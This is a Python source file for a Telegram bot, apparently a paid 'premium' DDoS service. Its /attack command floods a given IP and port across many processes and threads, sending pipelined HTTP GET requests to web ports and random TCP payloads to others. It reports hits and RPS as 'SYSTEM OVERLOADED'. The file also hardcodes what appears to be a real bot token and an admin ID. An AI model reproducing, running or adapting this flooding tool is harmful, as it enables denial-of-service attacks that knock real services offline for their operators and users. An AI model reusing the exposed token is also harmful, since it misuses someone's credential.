import telebot
import threading
import socket
import time
import ssl
import random
import multiprocessing
import os
import json
import resource
import signal
import sys

# ================= CONFIGURATION =================
TOKEN = "8685376799:AAE6oRnpVsfA5WisqtReVTfviEzB4wqsdh8"   # THAY TOKEN MỚI NẾU CẦN
bot = telebot.TeleBot(TOKEN)

ADMIN_NAME = "sHady"
ADMIN_IDS = [5225888903]  # THAY ID CỦA BẠN

# ================= AUTO DETECT TÀI NGUYÊN =================
def get_available_ram_mb():
    try:
        with open("/sys/fs/cgroup/memory/memory.limit_in_bytes", "r") as f:
            limit = int(f.read().strip())
            if limit > 10 * 1024**3:
                limit = None
        if limit:
            with open("/sys/fs/cgroup/memory/memory.usage_in_bytes", "r") as f:
                used = int(f.read().strip())
            avail = max(100, (limit - used) // (1024 * 1024))
            return avail
    except:
        pass
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
        if hard != resource.RLIM_INFINITY:
            used = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss * 1024
            return max(100, (hard - used) // (1024 * 1024))
    except:
        pass
    return 512

def get_pids_limit():
    try:
        with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
            val = f.read().strip()
            if val != "max":
                return int(val)
    except:
        pass
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NPROC)
        if hard > 0:
            return hard
    except:
        pass
    return 1024

def get_current_pids():
    try:
        with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
            return int(f.read().strip())
    except:
        return 0

def auto_tune():
    ram_mb = get_available_ram_mb()
    pids_limit = get_pids_limit()
    current_pids = get_current_pids()
    cpu = multiprocessing.cpu_count()

    max_threads_by_ram = max(20, ram_mb // 8)
    max_threads_by_pids = pids_limit - current_pids - 100
    max_threads = min(max_threads_by_ram, max_threads_by_pids, 500)
    max_threads = max(max_threads, 20)

    for proc in range(min(cpu, 4), 0, -1):
        per_proc = max_threads // proc
        if 10 <= per_proc <= 200:
            return proc, per_proc
    return 1, min(100, max_threads)

MAX_PROCESSES, THREADS_PER_PROC = auto_tune()
TOTAL_THREADS = MAX_PROCESSES * THREADS_PER_PROC

print(f"[AUTO] RAM khả dụng: {get_available_ram_mb()} MB, pids limit: {get_pids_limit()}, current: {get_current_pids()}")
print(f"[AUTO] Dùng {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {TOTAL_THREADS}")

# ================= DATA =================
SHARED_SUCCESS = multiprocessing.Value('L', 0)
WHITELIST_FILE = "whitelist.txt"
STATS_FILE = "stats.json"

USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
PATHS = ["/", "/index.html", "/api/v1/ping", "/login"]

ADS_MESSAGE = "━━━━━━━━━━━━━━━━━━\n💎 PREMIUM SERVICE BY SHADY 💎\n━━━━━━━━━━━━━━━━━━"
HELP_MESSAGE = (
    "🌟 HỆ THỐNG ĐIỀU KHIỂN 🌟\n\n"
    "🚀 /attack [IP] [Port]\n"
    "🛑 /stop\n"
    "🔍 /check [IP] [Port]\n"
    "📊 /stats\n"
    "🆔 /id\n"
    "🛡 /wlist\n"
    "{ads}"
)

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_attacks": 0, "total_hits": 0}
    with open(STATS_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return {"total_attacks": 0, "total_hits": 0}

def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def update_attack_stats(hits):
    stats = load_stats()
    stats["total_attacks"] += 1
    stats["total_hits"] += hits
    save_stats(stats)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def load_whitelist():
    if not os.path.exists(WHITELIST_FILE):
        return set()
    with open(WHITELIST_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        for ip in whitelist:
            f.write(f"{ip}\n")

# ================= ATTACK ENGINE (CHỈ TCP) =================
def attack_worker(ip, port, stop_event, shared_counter):
    payload_raw = os.urandom(2048)
    hyper_chunks = []
    for _ in range(5):
        chunk = b""
        for _ in range(1000):
            ua = random.choice(USER_AGENTS)
            path = random.choice(PATHS)
            chunk += (f"GET {path}?{random.getrandbits(16)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n").encode()
        hyper_chunks.append(chunk)

    def run_attack():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(5)
                if port == 443:
                    context = ssl._create_unverified_context()
                    s = context.wrap_socket(s, server_hostname=ip)
                s.connect((ip, port))
                while not stop_event.is_set():
                    try:
                        if port in [80, 443]:
                            s.send(random.choice(hyper_chunks))
                            with shared_counter.get_lock():
                                shared_counter.value += 1000
                        else:
                            s.send(payload_raw)
                            with shared_counter.get_lock():
                                shared_counter.value += 1
                    except:
                        break
                s.close()
            except:
                time.sleep(0.01)

    threads = []
    for _ in range(THREADS_PER_PROC):
        t = threading.Thread(target=run_attack, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    stop_event.wait()

def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
    last_val = 0
    start_time = time.time()
    while not stop_event.is_set():
        try:
            time.sleep(1.5)
            cur_val = shared_counter.value
            elapsed = time.time() - start_time
            rps = (cur_val - last_val) / 1.5
            last_val = cur_val
            m, s = divmod(int(elapsed), 60)
            status_text = (
                f"🚀 **ATTACK STATUS** 🚀\n"
                f"🎯 `{ip}:{port}`\n"
                f"✅ Hits: `{cur_val:,}` | RPS: `{rps:,.0f}`\n"
                f"⏳ Time: `{m:02d}:{s:02d}`\n"
                f"🔥 Status: `SYSTEM OVERLOADED`"
            )
            bot.edit_message_text(status_text, chat_id, msg_id, parse_mode='Markdown')
        except:
            pass
    final_hits = shared_counter.value
    update_attack_stats(final_hits)
    bot.send_message(chat_id, f"🛑 **ATTACK STOPPED:** `{ip}`\n📊 Total Hits: `{final_hits:,}`", parse_mode='Markdown')

# ================= HANDLERS =================
active_procs = []
stop_event = None

@bot.message_handler(commands=['check'])
def handle_check(message):
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /check [IP] [Port]")
    ip = parts[1]
    port = int(parts[2]) if len(parts) > 2 else 80
    msg = bot.reply_to(message, f"🔍 Đang kiểm tra `{ip}:{port}`...", parse_mode='Markdown')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        start = time.time()
        result = s.connect_ex((ip, port))
        end = time.time()
        s.close()
        if result == 0:
            bot.edit_message_text(f"✅ **SERVER ALIVE**\nPing: `{int((end-start)*1000)}ms`", message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(f"❌ **SERVER DEAD**", message.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ Lỗi: `{e}`", message.chat.id, msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    stats = load_stats()
    text = (
        f"📊 **THỐNG KÊ**\n"
        f"🚀 Attacks: `{stats['total_attacks']}`\n"
        f"✅ Hits: `{stats['total_hits']:,}`\n"
        f"🖥 Cấu hình: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def handle_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.from_user.id}`")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_procs, stop_event
    if len(active_procs) > 0:
        return bot.reply_to(message, "⚠️ Another attack is active! Use /stop first.")
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /attack [IP] [Port]")
    ip = parts[1]
    if ip in load_whitelist():
        return bot.reply_to(message, f"🛡 IP whitelisted!")
    port = int(parts[2]) if len(parts) > 2 else 80

    SHARED_SUCCESS.value = 0
    stop_event = multiprocessing.Event()
    initial_msg = bot.reply_to(message, f"⚡ **Starting attack on {ip}:{port}**\n🚀 {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads")
    for _ in range(MAX_PROCESSES):
        p = multiprocessing.Process(target=attack_worker, args=(ip, port, stop_event, SHARED_SUCCESS))
        p.daemon = True
        p.start()
        active_procs.append(p)
    threading.Thread(target=monitor_report, args=(message.chat.id, initial_msg.message_id, ip, port, stop_event, SHARED_SUCCESS), daemon=True).start()

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global active_procs, stop_event
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Permission denied.")
    if stop_event:
        stop_event.set()
    for p in active_procs:
        try:
            p.terminate()
        except:
            pass
    active_procs = []
    bot.reply_to(message, "🛑 Attack stopped!")

@bot.message_handler(commands=['wadd'])
def handle_wadd(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /wadd [IP]")
    ip = parts[1]
    wl = load_whitelist()
    wl.add(ip)
    save_whitelist(wl)
    bot.reply_to(message, f"✅ Added `{ip}` to whitelist.", parse_mode='Markdown')

@bot.message_handler(commands=['wlist'])
def handle_wlist(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 Admin only.")
    wl = load_whitelist()
    if not wl:
        return bot.reply_to(message, "Empty whitelist.")
    list_text = "🛡 **WHITELIST:**\n" + "\n".join(f"• `{ip}`" for ip in wl)
    bot.send_message(message.chat.id, list_text, parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.send_message(message.chat.id, HELP_MESSAGE.format(ads=ADS_MESSAGE), parse_mode='Markdown')

# ================= KHỞI CHẠY VỚI KHẢ NĂNG DỪNG BẰNG Ctrl+C =================
def signal_handler(sig, frame):
    print("\n🛑 Đang dừng bot...")
    if stop_event is not None:
        stop_event.set()
    for p in active_procs:
        try:
            p.terminate()
        except:
            pass
    time.sleep(1)
    sys.exit(0)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    signal.signal(signal.SIGINT, signal_handler)
    print(f"--- SYSTEM READY | ADMIN: {ADMIN_NAME} ---")
    print(f"--- AUTO-CONFIG: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {TOTAL_THREADS} total ---")
    while True:
        try:
            print("Bot đang bắt đầu Polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(10)
